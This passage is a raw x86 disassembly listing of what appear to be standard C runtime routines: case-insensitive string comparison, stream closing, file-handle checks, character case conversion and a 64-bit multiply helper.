  40e3fb:	83 c4 08             	add    $0x8,%esp
  40e3fe:	e9 04 ff ff ff       	jmp    0x40e307
  40e403:	6a 02                	push   $0x2
  40e405:	e8 06 51 ff ff       	call   0x403510
  40e40a:	83 c4 04             	add    $0x4,%esp
  40e40d:	83 7d 08 01          	cmpl   $0x1,0x8(%ebp)
  40e411:	75 05                	jne    0x40e418
  40e413:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40e416:	eb 03                	jmp    0x40e41b
  40e418:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40e41b:	8b e5                	mov    %ebp,%esp
  40e41d:	5d                   	pop    %ebp
  40e41e:	c3                   	ret
  40e41f:	cc                   	int3
  40e420:	55                   	push   %ebp
  40e421:	8b ec                	mov    %esp,%ebp
  40e423:	6a 02                	push   $0x2
  40e425:	e8 a6 4f ff ff       	call   0x4033d0
  40e42a:	83 c4 04             	add    $0x4,%esp
  40e42d:	5d                   	pop    %ebp
  40e42e:	c3                   	ret
  40e42f:	cc                   	int3
  40e430:	55                   	push   %ebp
  40e431:	8b ec                	mov    %esp,%ebp
  40e433:	57                   	push   %edi
  40e434:	56                   	push   %esi
  40e435:	53                   	push   %ebx
  40e436:	8b 75 0c             	mov    0xc(%ebp),%esi
  40e439:	8b 7d 08             	mov    0x8(%ebp),%edi
  40e43c:	8d 05 78 de 45 00    	lea    0x45de78,%eax
  40e442:	83 78 08 00          	cmpl   $0x0,0x8(%eax)
  40e446:	75 3b                	jne    0x40e483
  40e448:	b0 ff                	mov    $0xff,%al
  40e44a:	8b ff                	mov    %edi,%edi
  40e44c:	0a c0                	or     %al,%al
  40e44e:	74 2e                	je     0x40e47e
  40e450:	8a 06                	mov    (%esi),%al
  40e452:	46                   	inc    %esi
  40e453:	8a 27                	mov    (%edi),%ah
  40e455:	47                   	inc    %edi
  40e456:	38 c4                	cmp    %al,%ah
  40e458:	74 f2                	je     0x40e44c
  40e45a:	2c 41                	sub    $0x41,%al
  40e45c:	3c 1a                	cmp    $0x1a,%al
  40e45e:	1a c9                	sbb    %cl,%cl
  40e460:	80 e1 20             	and    $0x20,%cl
  40e463:	02 c1                	add    %cl,%al
  40e465:	04 41                	add    $0x41,%al
  40e467:	86 e0                	xchg   %ah,%al
  40e469:	2c 41                	sub    $0x41,%al
  40e46b:	3c 1a                	cmp    $0x1a,%al
  40e46d:	1a c9                	sbb    %cl,%cl
  40e46f:	80 e1 20             	and    $0x20,%cl
  40e472:	02 c1                	add    %cl,%al
  40e474:	04 41                	add    $0x41,%al
  40e476:	38 e0                	cmp    %ah,%al
  40e478:	74 d2                	je     0x40e44c
  40e47a:	1a c0                	sbb    %al,%al
  40e47c:	1c ff                	sbb    $0xff,%al
  40e47e:	0f be c0             	movsbl %al,%eax
  40e481:	eb 78                	jmp    0x40e4fb
  40e483:	f0 ff 05 08 f0 45 00 	lock incl 0x45f008
  40e48a:	83 3d 04 f0 45 00 00 	cmpl   $0x0,0x45f004
  40e491:	7f 04                	jg     0x40e497
  40e493:	6a 00                	push   $0x0
  40e495:	eb 15                	jmp    0x40e4ac
  40e497:	f0 ff 0d 08 f0 45 00 	lock decl 0x45f008
  40e49e:	6a 13                	push   $0x13
  40e4a0:	e8 cb 4f ff ff       	call   0x403470
  40e4a5:	c7 04 24 01 00 00 00 	movl   $0x1,(%esp)
  40e4ac:	b8 ff 00 00 00       	mov    $0xff,%eax
  40e4b1:	33 db                	xor    %ebx,%ebx
  40e4b3:	90                   	nop
  40e4b4:	0a c0                	or     %al,%al
  40e4b6:	74 27                	je     0x40e4df
  40e4b8:	8a 06                	mov    (%esi),%al
  40e4ba:	46                   	inc    %esi
  40e4bb:	8a 1f                	mov    (%edi),%bl
  40e4bd:	47                   	inc    %edi
  40e4be:	38 d8                	cmp    %bl,%al
  40e4c0:	74 f2                	je     0x40e4b4
  40e4c2:	50                   	push   %eax
  40e4c3:	53                   	push   %ebx
  40e4c4:	e8 77 03 00 00       	call   0x40e840
  40e4c9:	8b d8                	mov    %eax,%ebx
  40e4cb:	83 c4 04             	add    $0x4,%esp
  40e4ce:	e8 6d 03 00 00       	call   0x40e840
  40e4d3:	83 c4 04             	add    $0x4,%esp
  40e4d6:	38 c3                	cmp    %al,%bl
  40e4d8:	74 da                	je     0x40e4b4
  40e4da:	1b c0                	sbb    %eax,%eax
  40e4dc:	83 d8 ff             	sbb    $0xffffffff,%eax
  40e4df:	8b d8                	mov    %eax,%ebx
  40e4e1:	58                   	pop    %eax
  40e4e2:	0b c0                	or     %eax,%eax
  40e4e4:	75 09                	jne    0x40e4ef
  40e4e6:	f0 ff 0d 08 f0 45 00 	lock decl 0x45f008
  40e4ed:	eb 0a                	jmp    0x40e4f9
  40e4ef:	6a 13                	push   $0x13
  40e4f1:	e8 1a 50 ff ff       	call   0x403510
  40e4f6:	83 c4 04             	add    $0x4,%esp
  40e4f9:	8b c3                	mov    %ebx,%eax
  40e4fb:	5b                   	pop    %ebx
  40e4fc:	5e                   	pop    %esi
  40e4fd:	5f                   	pop    %edi
  40e4fe:	c9                   	leave
  40e4ff:	c3                   	ret
  40e500:	55                   	push   %ebp
  40e501:	8b ec                	mov    %esp,%ebp
  40e503:	57                   	push   %edi
  40e504:	56                   	push   %esi
  40e505:	53                   	push   %ebx
  40e506:	8b 4d 10             	mov    0x10(%ebp),%ecx
  40e509:	0b c9                	or     %ecx,%ecx
  40e50b:	0f 84 e9 00 00 00    	je     0x40e5fa
  40e511:	8b 75 08             	mov    0x8(%ebp),%esi
  40e514:	8b 7d 0c             	mov    0xc(%ebp),%edi
  40e517:	8d 05 78 de 45 00    	lea    0x45de78,%eax
  40e51d:	83 78 08 00          	cmpl   $0x0,0x8(%eax)
  40e521:	75 4e                	jne    0x40e571
  40e523:	b7 41                	mov    $0x41,%bh
  40e525:	b3 5a                	mov    $0x5a,%bl
  40e527:	b6 20                	mov    $0x20,%dh
  40e529:	8d 49 00             	lea    0x0(%ecx),%ecx
  40e52c:	8a 26                	mov    (%esi),%ah
  40e52e:	0a e4                	or     %ah,%ah
  40e530:	8a 07                	mov    (%edi),%al
  40e532:	74 21                	je     0x40e555
  40e534:	0a c0                	or     %al,%al
  40e536:	74 1d                	je     0x40e555
  40e538:	46                   	inc    %esi
  40e539:	47                   	inc    %edi
  40e53a:	38 fc                	cmp    %bh,%ah
  40e53c:	72 06                	jb     0x40e544
  40e53e:	38 dc                	cmp    %bl,%ah
  40e540:	77 02                	ja     0x40e544
  40e542:	02 e6                	add    %dh,%ah
  40e544:	38 f8                	cmp    %bh,%al
  40e546:	72 06                	jb     0x40e54e
  40e548:	38 d8                	cmp    %bl,%al
  40e54a:	77 02                	ja     0x40e54e
  40e54c:	02 c6                	add    %dh,%al
  40e54e:	38 c4                	cmp    %al,%ah
  40e550:	75 0d                	jne    0x40e55f
  40e552:	49                   	dec    %ecx
  40e553:	75 d7                	jne    0x40e52c
  40e555:	33 c9                	xor    %ecx,%ecx
  40e557:	38 c4                	cmp    %al,%ah
  40e559:	0f 84 9b 00 00 00    	je     0x40e5fa
  40e55f:	b9 ff ff ff ff       	mov    $0xffffffff,%ecx
  40e564:	0f 82 90 00 00 00    	jb     0x40e5fa
  40e56a:	f7 d9                	neg    %ecx
  40e56c:	e9 89 00 00 00       	jmp    0x40e5fa
  40e571:	f0 ff 05 08 f0 45 00 	lock incl 0x45f008
  40e578:	83 3d 04 f0 45 00 00 	cmpl   $0x0,0x45f004
  40e57f:	7f 04                	jg     0x40e585
  40e581:	6a 00                	push   $0x0
  40e583:	eb 19                	jmp    0x40e59e
  40e585:	f0 ff 0d 08 f0 45 00 	lock decl 0x45f008
  40e58c:	8b d9                	mov    %ecx,%ebx
  40e58e:	6a 13                	push   $0x13
  40e590:	e8 db 4e ff ff       	call   0x403470
  40e595:	c7 04 24 01 00 00 00 	movl   $0x1,(%esp)
  40e59c:	8b cb                	mov    %ebx,%ecx
  40e59e:	33 c0                	xor    %eax,%eax
  40e5a0:	33 db                	xor    %ebx,%ebx
  40e5a2:	8b ff                	mov    %edi,%edi
  40e5a4:	8a 06                	mov    (%esi),%al
  40e5a6:	0b c0                	or     %eax,%eax
  40e5a8:	8a 1f                	mov    (%edi),%bl
  40e5aa:	74 23                	je     0x40e5cf
  40e5ac:	0b db                	or     %ebx,%ebx
  40e5ae:	74 1f                	je     0x40e5cf
  40e5b0:	46                   	inc    %esi
  40e5b1:	47                   	inc    %edi
  40e5b2:	51                   	push   %ecx
  40e5b3:	50                   	push   %eax
  40e5b4:	53                   	push   %ebx
  40e5b5:	e8 86 02 00 00       	call   0x40e840
  40e5ba:	8b d8                	mov    %eax,%ebx
  40e5bc:	83 c4 04             	add    $0x4,%esp
  40e5bf:	e8 7c 02 00 00       	call   0x40e840
  40e5c4:	83 c4 04             	add    $0x4,%esp
  40e5c7:	59                   	pop    %ecx
  40e5c8:	3b c3                	cmp    %ebx,%eax
  40e5ca:	75 09                	jne    0x40e5d5
  40e5cc:	49                   	dec    %ecx
  40e5cd:	75 d5                	jne    0x40e5a4
  40e5cf:	33 c9                	xor    %ecx,%ecx
  40e5d1:	3b c3                	cmp    %ebx,%eax
  40e5d3:	74 09                	je     0x40e5de
  40e5d5:	b9 ff ff ff ff       	mov    $0xffffffff,%ecx
  40e5da:	72 02                	jb     0x40e5de
  40e5dc:	f7 d9                	neg    %ecx
  40e5de:	58                   	pop    %eax
  40e5df:	0b c0                	or     %eax,%eax
  40e5e1:	75 09                	jne    0x40e5ec
  40e5e3:	f0 ff 0d 08 f0 45 00 	lock decl 0x45f008
  40e5ea:	eb 0e                	jmp    0x40e5fa
  40e5ec:	8b d9                	mov    %ecx,%ebx
  40e5ee:	6a 13                	push   $0x13
  40e5f0:	e8 1b 4f ff ff       	call   0x403510
  40e5f5:	83 c4 04             	add    $0x4,%esp
  40e5f8:	8b cb                	mov    %ebx,%ecx
  40e5fa:	8b c1                	mov    %ecx,%eax
  40e5fc:	5b                   	pop    %ebx
  40e5fd:	5e                   	pop    %esi
  40e5fe:	5f                   	pop    %edi
  40e5ff:	c9                   	leave
  40e600:	c3                   	ret
  40e601:	cc                   	int3
  40e602:	cc                   	int3
  40e603:	cc                   	int3
  40e604:	cc                   	int3
  40e605:	cc                   	int3
  40e606:	cc                   	int3
  40e607:	cc                   	int3
  40e608:	cc                   	int3
  40e609:	cc                   	int3
  40e60a:	cc                   	int3
  40e60b:	cc                   	int3
  40e60c:	cc                   	int3
  40e60d:	cc                   	int3
  40e60e:	cc                   	int3
  40e60f:	cc                   	int3
  40e610:	55                   	push   %ebp
  40e611:	8b ec                	mov    %esp,%ebp
  40e613:	51                   	push   %ecx
  40e614:	53                   	push   %ebx
  40e615:	56                   	push   %esi
  40e616:	57                   	push   %edi
  40e617:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  40e61e:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  40e622:	75 1e                	jne    0x40e642
  40e624:	68 a0 ff 40 00       	push   $0x40ffa0
  40e629:	6a 00                	push   $0x0
  40e62b:	6a 3a                	push   $0x3a
  40e62d:	68 94 ff 40 00       	push   $0x40ff94
  40e632:	6a 02                	push   $0x2
  40e634:	e8 87 af ff ff       	call   0x4095c0
  40e639:	83 c4 14             	add    $0x14,%esp
  40e63c:	83 f8 01             	cmp    $0x1,%eax
  40e63f:	75 01                	jne    0x40e642
  40e641:	cc                   	int3
  40e642:	33 c0                	xor    %eax,%eax
  40e644:	85 c0                	test   %eax,%eax
  40e646:	75 d6                	jne    0x40e61e
  40e648:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40e64b:	8b 51 0c             	mov    0xc(%ecx),%edx
  40e64e:	83 e2 40             	and    $0x40,%edx
  40e651:	85 d2                	test   %edx,%edx
  40e653:	74 0c                	je     0x40e661
  40e655:	8b 45 08             	mov    0x8(%ebp),%eax
  40e658:	c7 40 0c 00 00 00 00 	movl   $0x0,0xc(%eax)
  40e65f:	eb 27                	jmp    0x40e688
  40e661:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40e664:	51                   	push   %ecx
  40e665:	e8 e6 f5 ff ff       	call   0x40dc50
  40e66a:	83 c4 04             	add    $0x4,%esp
  40e66d:	8b 55 08             	mov    0x8(%ebp),%edx
  40e670:	52                   	push   %edx
  40e671:	e8 2a 00 00 00       	call   0x40e6a0
  40e676:	83 c4 04             	add    $0x4,%esp
  40e679:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40e67c:	8b 45 08             	mov    0x8(%ebp),%eax
  40e67f:	50                   	push   %eax
  40e680:	e8 3b f6 ff ff       	call   0x40dcc0
  40e685:	83 c4 04             	add    $0x4,%esp
  40e688:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40e68b:	5f                   	pop    %edi
  40e68c:	5e                   	pop    %esi
  40e68d:	5b                   	pop    %ebx
  40e68e:	8b e5                	mov    %ebp,%esp
  40e690:	5d                   	pop    %ebp
  40e691:	c3                   	ret
  40e692:	cc                   	int3
  40e693:	cc                   	int3
  40e694:	cc                   	int3
  40e695:	cc                   	int3
  40e696:	cc                   	int3
  40e697:	cc                   	int3
  40e698:	cc                   	int3
  40e699:	cc                   	int3
  40e69a:	cc                   	int3
  40e69b:	cc                   	int3
  40e69c:	cc                   	int3
  40e69d:	cc                   	int3
  40e69e:	cc                   	int3
  40e69f:	cc                   	int3
  40e6a0:	55                   	push   %ebp
  40e6a1:	8b ec                	mov    %esp,%ebp
  40e6a3:	83 ec 08             	sub    $0x8,%esp
  40e6a6:	53                   	push   %ebx
  40e6a7:	56                   	push   %esi
  40e6a8:	57                   	push   %edi
  40e6a9:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  40e6b0:	8b 45 08             	mov    0x8(%ebp),%eax
  40e6b3:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40e6b6:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  40e6ba:	75 1e                	jne    0x40e6da
  40e6bc:	68 c0 fd 40 00       	push   $0x40fdc0
  40e6c1:	6a 00                	push   $0x0
  40e6c3:	6a 77                	push   $0x77
  40e6c5:	68 94 ff 40 00       	push   $0x40ff94
  40e6ca:	6a 02                	push   $0x2
  40e6cc:	e8 ef ae ff ff       	call   0x4095c0
  40e6d1:	83 c4 14             	add    $0x14,%esp
  40e6d4:	83 f8 01             	cmp    $0x1,%eax
  40e6d7:	75 01                	jne    0x40e6da
  40e6d9:	cc                   	int3
  40e6da:	33 c9                	xor    %ecx,%ecx
  40e6dc:	85 c9                	test   %ecx,%ecx
  40e6de:	75 d6                	jne    0x40e6b6
  40e6e0:	8b 55 f8             	mov    -0x8(%ebp),%edx
  40e6e3:	8b 42 0c             	mov    0xc(%edx),%eax
  40e6e6:	25 83 00 00 00       	and    $0x83,%eax
  40e6eb:	85 c0                	test   %eax,%eax
  40e6ed:	74 5b                	je     0x40e74a
  40e6ef:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  40e6f2:	51                   	push   %ecx
  40e6f3:	e8 18 fb ff ff       	call   0x40e210
  40e6f8:	83 c4 04             	add    $0x4,%esp
  40e6fb:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40e6fe:	8b 55 f8             	mov    -0x8(%ebp),%edx
  40e701:	52                   	push   %edx
  40e702:	e8 d9 03 00 00       	call   0x40eae0
  40e707:	83 c4 04             	add    $0x4,%esp
  40e70a:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40e70d:	8b 48 10             	mov    0x10(%eax),%ecx
  40e710:	51                   	push   %ecx
  40e711:	e8 9a 02 00 00       	call   0x40e9b0
  40e716:	83 c4 04             	add    $0x4,%esp
  40e719:	85 c0                	test   %eax,%eax
  40e71b:	7d 09                	jge    0x40e726
  40e71d:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  40e724:	eb 24                	jmp    0x40e74a
  40e726:	8b 55 f8             	mov    -0x8(%ebp),%edx
  40e729:	83 7a 1c 00          	cmpl   $0x0,0x1c(%edx)
  40e72d:	74 1b                	je     0x40e74a
  40e72f:	6a 02                	push   $0x2
  40e731:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40e734:	8b 48 1c             	mov    0x1c(%eax),%ecx
  40e737:	51                   	push   %ecx
  40e738:	e8 f3 7a ff ff       	call   0x406230
  40e73d:	83 c4 08             	add    $0x8,%esp
  40e740:	8b 55 f8             	mov    -0x8(%ebp),%edx
  40e743:	c7 42 1c 00 00 00 00 	movl   $0x0,0x1c(%edx)
  40e74a:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40e74d:	c7 40 0c 00 00 00 00 	movl   $0x0,0xc(%eax)
  40e754:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40e757:	5f                   	pop    %edi
  40e758:	5e                   	pop    %esi
  40e759:	5b                   	pop    %ebx
  40e75a:	8b e5                	mov    %ebp,%esp
  40e75c:	5d                   	pop    %ebp
  40e75d:	c3                   	ret
  40e75e:	cc                   	int3
  40e75f:	cc                   	int3
  40e760:	55                   	push   %ebp
  40e761:	8b ec                	mov    %esp,%ebp
  40e763:	51                   	push   %ecx
  40e764:	8b 45 08             	mov    0x8(%ebp),%eax
  40e767:	3b 05 60 f3 45 00    	cmp    0x45f360,%eax
  40e76d:	73 22                	jae    0x40e791
  40e76f:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40e772:	c1 f9 05             	sar    $0x5,%ecx
  40e775:	8b 55 08             	mov    0x8(%ebp),%edx
  40e778:	83 e2 1f             	and    $0x1f,%edx
  40e77b:	6b d2 24             	imul   $0x24,%edx,%edx
  40e77e:	8b 04 8d 60 f2 45 00 	mov    0x45f260(,%ecx,4),%eax
  40e785:	0f be 4c 10 04       	movsbl 0x4(%eax,%edx,1),%ecx
  40e78a:	83 e1 01             	and    $0x1,%ecx
  40e78d:	85 c9                	test   %ecx,%ecx
  40e78f:	75 13                	jne    0x40e7a4
  40e791:	e8 6a d9 ff ff       	call   0x40c100
  40e796:	c7 00 09 00 00 00    	movl   $0x9,(%eax)
  40e79c:	83 c8 ff             	or     $0xffffffff,%eax
  40e79f:	e9 8a 00 00 00       	jmp    0x40e82e
  40e7a4:	8b 55 08             	mov    0x8(%ebp),%edx
  40e7a7:	52                   	push   %edx
  40e7a8:	e8 73 f8 ff ff       	call   0x40e020
  40e7ad:	83 c4 04             	add    $0x4,%esp
  40e7b0:	8b 45 08             	mov    0x8(%ebp),%eax
  40e7b3:	c1 f8 05             	sar    $0x5,%eax
  40e7b6:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40e7b9:	83 e1 1f             	and    $0x1f,%ecx
  40e7bc:	6b c9 24             	imul   $0x24,%ecx,%ecx
  40e7bf:	8b 14 85 60 f2 45 00 	mov    0x45f260(,%eax,4),%edx
  40e7c6:	0f be 44 0a 04       	movsbl 0x4(%edx,%ecx,1),%eax
  40e7cb:	83 e0 01             	and    $0x1,%eax
  40e7ce:	85 c0                	test   %eax,%eax
  40e7d0:	74 3b                	je     0x40e80d
  40e7d2:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40e7d5:	51                   	push   %ecx
  40e7d6:	e8 d5 f7 ff ff       	call   0x40dfb0
  40e7db:	83 c4 04             	add    $0x4,%esp
  40e7de:	50                   	push   %eax
  40e7df:	ff 15 f4 f0 40 00    	call   *0x40f0f4
  40e7e5:	85 c0                	test   %eax,%eax
  40e7e7:	75 0b                	jne    0x40e7f4
  40e7e9:	ff 15 58 f0 40 00    	call   *0x40f058
  40e7ef:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40e7f2:	eb 07                	jmp    0x40e7fb
  40e7f4:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  40e7fb:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  40e7ff:	75 02                	jne    0x40e803
  40e801:	eb 1c                	jmp    0x40e81f
  40e803:	e8 08 d9 ff ff       	call   0x40c110
  40e808:	8b 55 fc             	mov    -0x4(%ebp),%edx
  40e80b:	89 10                	mov    %edx,(%eax)
  40e80d:	e8 ee d8 ff ff       	call   0x40c100
  40e812:	c7 00 09 00 00 00    	movl   $0x9,(%eax)
  40e818:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  40e81f:	8b 45 08             	mov    0x8(%ebp),%eax
  40e822:	50                   	push   %eax
  40e823:	e8 88 f8 ff ff       	call   0x40e0b0
  40e828:	83 c4 04             	add    $0x4,%esp
  40e82b:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40e82e:	8b e5                	mov    %ebp,%esp
  40e830:	5d                   	pop    %ebp
  40e831:	c3                   	ret
  40e832:	cc                   	int3
  40e833:	cc                   	int3
  40e834:	cc                   	int3
  40e835:	cc                   	int3
  40e836:	cc                   	int3
  40e837:	cc                   	int3
  40e838:	cc                   	int3
  40e839:	cc                   	int3
  40e83a:	cc                   	int3
  40e83b:	cc                   	int3
  40e83c:	cc                   	int3
  40e83d:	cc                   	int3
  40e83e:	cc                   	int3
  40e83f:	cc                   	int3
  40e840:	55                   	push   %ebp
  40e841:	8b ec                	mov    %esp,%ebp
  40e843:	83 ec 10             	sub    $0x10,%esp
  40e846:	83 3d 80 de 45 00 00 	cmpl   $0x0,0x45de80
  40e84d:	75 1d                	jne    0x40e86c
  40e84f:	83 7d 08 41          	cmpl   $0x41,0x8(%ebp)
  40e853:	7c 0f                	jl     0x40e864
  40e855:	83 7d 08 5a          	cmpl   $0x5a,0x8(%ebp)
  40e859:	7f 09                	jg     0x40e864
  40e85b:	8b 45 08             	mov    0x8(%ebp),%eax
  40e85e:	83 c0 20             	add    $0x20,%eax
  40e861:	89 45 08             	mov    %eax,0x8(%ebp)
  40e864:	8b 45 08             	mov    0x8(%ebp),%eax
  40e867:	e9 fb 00 00 00       	jmp    0x40e967
  40e86c:	81 7d 08 00 01 00 00 	cmpl   $0x100,0x8(%ebp)
  40e873:	7d 3e                	jge    0x40e8b3
  40e875:	83 3d 10 d5 45 00 01 	cmpl   $0x1,0x45d510
  40e87c:	7e 13                	jle    0x40e891
  40e87e:	6a 01                	push   $0x1
  40e880:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40e883:	51                   	push   %ecx
  40e884:	e8 37 cc ff ff       	call   0x40b4c0
  40e889:	83 c4 08             	add    $0x8,%esp
  40e88c:	89 45 f0             	mov    %eax,-0x10(%ebp)
  40e88f:	eb 14                	jmp    0x40e8a5
  40e891:	8b 55 08             	mov    0x8(%ebp),%edx
  40e894:	a1 04 d3 45 00       	mov    0x45d304,%eax
  40e899:	33 c9                	xor    %ecx,%ecx
  40e89b:	66 8b 0c 50          	mov    (%eax,%edx,2),%cx
  40e89f:	83 e1 01             	and    $0x1,%ecx
  40e8a2:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  40e8a5:	83 7d f0 00          	cmpl   $0x0,-0x10(%ebp)
  40e8a9:	75 08                	jne    0x40e8b3
  40e8ab:	8b 45 08             	mov    0x8(%ebp),%eax
  40e8ae:	e9 b4 00 00 00       	jmp    0x40e967
  40e8b3:	8b 55 08             	mov    0x8(%ebp),%edx
  40e8b6:	c1 fa 08             	sar    $0x8,%edx
  40e8b9:	81 e2 ff 00 00 00    	and    $0xff,%edx
  40e8bf:	81 e2 ff 00 00 00    	and    $0xff,%edx
  40e8c5:	a1 04 d3 45 00       	mov    0x45d304,%eax
  40e8ca:	33 c9                	xor    %ecx,%ecx
  40e8cc:	66 8b 0c 50          	mov    (%eax,%edx,2),%cx
  40e8d0:	81 e1 00 80 00 00    	and    $0x8000,%ecx
  40e8d6:	85 c9                	test   %ecx,%ecx
  40e8d8:	74 22                	je     0x40e8fc
  40e8da:	8b 55 08             	mov    0x8(%ebp),%edx
  40e8dd:	c1 fa 08             	sar    $0x8,%edx
  40e8e0:	81 e2 ff 00 00 00    	and    $0xff,%edx
  40e8e6:	88 55 f8             	mov    %dl,-0x8(%ebp)
  40e8e9:	8a 45 08             	mov    0x8(%ebp),%al
  40e8ec:	88 45 f9             	mov    %al,-0x7(%ebp)
  40e8ef:	c6 45 fa 00          	movb   $0x0,-0x6(%ebp)
  40e8f3:	c7 45 fc 02 00 00 00 	movl   $0x2,-0x4(%ebp)
  40e8fa:	eb 11                	jmp    0x40e90d
  40e8fc:	8a 4d 08             	mov    0x8(%ebp),%cl
  40e8ff:	88 4d f8             	mov    %cl,-0x8(%ebp)
  40e902:	c6 45 f9 00          	movb   $0x0,-0x7(%ebp)
  40e906:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  40e90d:	6a 01                	push   $0x1
  40e90f:	6a 00                	push   $0x0
  40e911:	6a 03                	push   $0x3
  40e913:	8d 55 f4             	lea    -0xc(%ebp),%edx
  40e916:	52                   	push   %edx
  40e917:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40e91a:	50                   	push   %eax
  40e91b:	8d 4d f8             	lea    -0x8(%ebp),%ecx
  40e91e:	51                   	push   %ecx
  40e91f:	68 00 01 00 00       	push   $0x100
  40e924:	8b 15 80 de 45 00    	mov    0x45de80,%edx
  40e92a:	52                   	push   %edx
  40e92b:	e8 10 d2 ff ff       	call   0x40bb40
  40e930:	83 c4 20             	add    $0x20,%esp
  40e933:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40e936:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  40e93a:	75 05                	jne    0x40e941
  40e93c:	8b 45 08             	mov    0x8(%ebp),%eax
  40e93f:	eb 26                	jmp    0x40e967
  40e941:	83 7d fc 01          	cmpl   $0x1,-0x4(%ebp)
  40e945:	75 0a                	jne    0x40e951
  40e947:	8b 45 f4             	mov    -0xc(%ebp),%eax
  40e94a:	25 ff 00 00 00       	and    $0xff,%eax
  40e94f:	eb 16                	jmp    0x40e967
  40e951:	8b 45 f4             	mov    -0xc(%ebp),%eax
  40e954:	25 ff 00 00 00       	and    $0xff,%eax
  40e959:	8b 4d f5             	mov    -0xb(%ebp),%ecx
  40e95c:	81 e1 ff 00 00 00    	and    $0xff,%ecx
  40e962:	c1 e1 08             	shl    $0x8,%ecx
  40e965:	0b c1                	or     %ecx,%eax
  40e967:	8b e5                	mov    %ebp,%esp
  40e969:	5d                   	pop    %ebp
  40e96a:	c3                   	ret
  40e96b:	cc                   	int3
  40e96c:	cc                   	int3
  40e96d:	cc                   	int3
  40e96e:	cc                   	int3
  40e96f:	cc                   	int3
  40e970:	8b 44 24 08          	mov    0x8(%esp),%eax
  40e974:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  40e978:	0b c8                	or     %eax,%ecx
  40e97a:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  40e97e:	75 09                	jne    0x40e989
  40e980:	8b 44 24 04          	mov    0x4(%esp),%eax
  40e984:	f7 e1                	mul    %ecx
  40e986:	c2 10 00             	ret    $0x10
  40e989:	53                   	push   %ebx
  40e98a:	f7 e1                	mul    %ecx
  40e98c:	8b d8                	mov    %eax,%ebx
  40e98e:	8b 44 24 08          	mov    0x8(%esp),%eax
  40e992:	f7 64 24 14          	mull   0x14(%esp)
  40e996:	03 d8                	add    %eax,%ebx
  40e998:	8b 44 24 08          	mov    0x8(%esp),%eax
  40e99c:	f7 e1                	mul    %ecx
  40e99e:	03 d3                	add    %ebx,%edx
  40e9a0:	5b                   	pop    %ebx
  40e9a1:	c2 10 00             	ret    $0x10
  40e9a4:	cc                   	int3
  40e9a5:	cc                   	int3
  40e9a6:	cc                   	int3
  40e9a7:	cc                   	int3
  40e9a8:	cc                   	int3
  40e9a9:	cc                   	int3
  40e9aa:	cc                   	int3
  40e9ab:	cc                   	int3
  40e9ac:	cc                   	int3
  40e9ad:	cc                   	int3
  40e9ae:	cc                   	int3
  40e9af:	cc                   	int3
  40e9b0:	55                   	push   %ebp
  40e9b1:	8b ec                	mov    %esp,%ebp
  40e9b3:	51                   	push   %ecx
  40e9b4:	8b 45 08             	mov    0x8(%ebp),%eax
  40e9b7:	3b 05 60 f3 45 00    	cmp    0x45f360,%eax
  40e9bd:	73 22                	jae    0x40e9e1
  40e9bf:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40e9c2:	c1 f9 05             	sar    $0x5,%ecx
  40e9c5:	8b 55 08             	mov    0x8(%ebp),%edx
  40e9c8:	83 e2 1f             	and    $0x1f,%edx
  40e9cb:	6b d2 24             	imul   $0x24,%edx,%edx
  40e9ce:	8b 04 8d 60 f2 45 00 	mov    0x45f260(,%ecx,4),%eax
  40e9d5:	0f be 4c 10 04       	movsbl 0x4(%eax,%edx,1),%ecx
  40e9da:	83 e1 01             	and    $0x1,%ecx
  40e9dd:	85 c9                	test   %ecx,%ecx
  40e9df:	75 1b                	jne    0x40e9fc
  40e9e1:	e8 1a d7 ff ff       	call   0x40c100
  40e9e6:	c7 00 09 00 00 00    	movl   $0x9,(%eax)
  40e9ec:	e8 1f d7 ff ff       	call   0x40c110
  40e9f1:	c7 00 00 00 00 00    	movl   $0x0,(%eax)
  40e9f7:	83 c8 ff             	or     $0xffffffff,%eax
  40e9fa:	eb 2a                	jmp    0x40ea26
  40e9fc:	8b 55 08             	mov    0x8(%ebp),%edx
  40e9ff:	52                   	push   %edx
  40ea00:	e8 1b f6 ff ff       	call   0x40e020
  40ea05:	83 c4 04             	add    $0x4,%esp
  40ea08:	8b 45 08             	mov    0x8(%ebp),%eax
  40ea0b:	50                   	push   %eax
  40ea0c:	e8 1f 00 00 00       	call   0x40ea30
  40ea11:	83 c4 04             	add    $0x4,%esp
  40ea14:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40ea17:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40ea1a:	51                   	push   %ecx
  40ea1b:	e8 90 f6 ff ff       	call   0x40e0b0
